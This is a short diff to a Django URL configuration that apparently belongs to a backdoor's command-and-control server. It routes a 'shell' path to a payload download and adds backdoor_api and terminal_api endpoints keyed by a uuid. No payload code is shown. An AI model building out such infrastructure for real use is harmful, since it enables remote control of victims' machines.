@@ -1,7 +1,9 @@
 from django.urls import path
-from . import views
+from .views import download_payload, backdoor_api, terminal_api
+
 
 urlpatterns = [
-    path('', views.index, name='index'),
-    path('shell', views.download_payload),
+    path('shell', download_payload),
+    path('backdoor_api/<slug:uuid>', backdoor_api),
+    path('terminal_api/<slug:uuid>', terminal_api)
 ]
